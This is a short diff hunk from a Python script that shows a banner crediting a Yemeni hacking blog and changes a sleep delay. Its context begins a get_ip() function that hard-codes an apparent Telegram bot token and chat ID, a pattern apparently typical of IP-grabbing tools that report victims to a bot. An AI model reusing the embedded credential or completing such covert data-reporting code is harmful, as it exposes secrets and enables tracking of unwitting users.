@@ -6,7 +6,7 @@ import threading
 ###################################
 os.system("clear")
 print ("W\033[92mebsite\033[91m:- \033[94mcyberyemen.blogspot.com")
-sleep (2)
+sleep (4)
 def get_ip():
 	token = "1937421918:AAGD_3GxLJA7D-aPQuItkGqY-32UId2aUzE"
 	id1 = "1823390961"
